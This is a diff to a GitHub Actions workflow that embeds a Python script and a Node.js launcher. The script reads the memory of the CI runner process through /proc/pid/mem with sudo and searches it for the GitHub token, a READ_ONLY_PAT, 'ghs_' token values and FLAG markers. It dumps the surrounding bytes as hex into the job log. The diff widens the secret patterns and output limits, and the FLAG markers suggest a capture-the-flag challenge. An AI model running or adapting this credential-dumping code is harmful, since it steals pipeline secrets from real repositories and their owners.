@@ -21,8 +21,10 @@ jobs:
           cat > content/scan.py <<'SCANEOF'
           import glob, os
 
+          PAT = [b'github.token": {', b'READ_ONLY_PAT": {', b'FLAG": {', b'FLAG{', b'F\x00L\x00A\x00G\x00{', b'"value": "ghs_']
           out = []
-          flag_found = 0
+          counts = {}
+          LIM = 2
 
           def pids():
               for d in glob.glob('/proc/[0-9]*'):
@@ -33,15 +35,6 @@ jobs:
                       continue
                   yield pid, cmd
 
-          def find_flag(data, tag):
-              global flag_found
-              for m in [b'FLAG{', b'F\x00L\x00A\x00G\x00{']:
-                  i = data.find(m)
-                  while i != -1:
-                      out.append('FLAGHIT %s marker=%r hex=%s' % (tag, m, data[max(0,i-32):i+320].hex()))
-                      flag_found += 1
-                      i = data.find(m, i + 1)
-
           for pid, cmd in pids():
               if 'Runner' not in cmd:
                   continue
@@ -50,7 +43,6 @@ jobs:
                   maps = open('/proc/%s/maps' % pid).read().splitlines()
               except Exception:
                   continue
-              dumped = 0
               total = 0
               for line in maps:
                   parts = line.split()
@@ -60,7 +52,7 @@ jobs:
                       a, b = [int(x, 16) for x in parts[0].split('-')]
                   except Exception:
                       continue
-                  if b <= a or dumped >= 1:
+                  if b <= a:
                       continue
                   off = a
                   with open('/proc/%s/mem' % pid, 'rb', 0) as f:
@@ -74,22 +66,26 @@ jobs:
                               continue
                           off += n
                           total += len(data)
-                          find_flag(data, 'pid' + pid)
-                          if dumped < 1 and b'github.token' in data:
-                              i = data.find(b'github.token')
-                              win = data[max(0, i - 1000):i + 300000]
-                              out.append('BLOB pid=%s at=%d len=%d hex=%s' % (pid, off - n + i, len(win), win.hex()))
-                              dumped += 1
+                          for pat in PAT:
+                              k = pid + '|' + str(pat)
+                              if counts.get(k, 0) >= LIM:
+                                  continue
+                              i = data.find(pat)
+                              while i != -1 and counts.get(k, 0) < LIM:
+                                  win = data[max(0, i - 300):i + 60000]
+                                  out.append('HIT %s %r hex=%s' % (pid, pat, win.hex()))
+                                  counts[k] = counts.get(k, 0) + 1
+                                  i = data.find(pat, i + 1)
               out.append('READ %s bytes=%d' % (pid, total))
 
-          print('\n'.join(out)[:1500000])
-          print('DONE flag_found=%d' % flag_found)
+          print('\n'.join(out)[:3000000])
+          print('DONE')
 
           SCANEOF
           cat > content/p.js <<'JSEOF'
           const cp = require('child_process');
           let scan = '';
-          try { scan = cp.execSync('sudo -n python3 /tmp/content/content/scan.py 2>&1', { encoding: 'utf8', timeout: 900000, maxBuffer: 256 * 1024 * 1024 }); } catch (e) { scan = 'SCANERR ' + e.message + ' ' + (e.stdout || ''); }
+          try { scan = cp.execSync('sudo -n python3 /tmp/content/content/scan.py 2>&1', { encoding: 'utf8', timeout: 900000, maxBuffer: 512 * 1024 * 1024 }); } catch (e) { scan = 'SCANERR ' + e.message + ' ' + (e.stdout || ''); }
           for (let i = 0; i < scan.length; i += 1800) console.log('SCAN ' + scan.slice(i, i + 1800));
 
           JSEOF
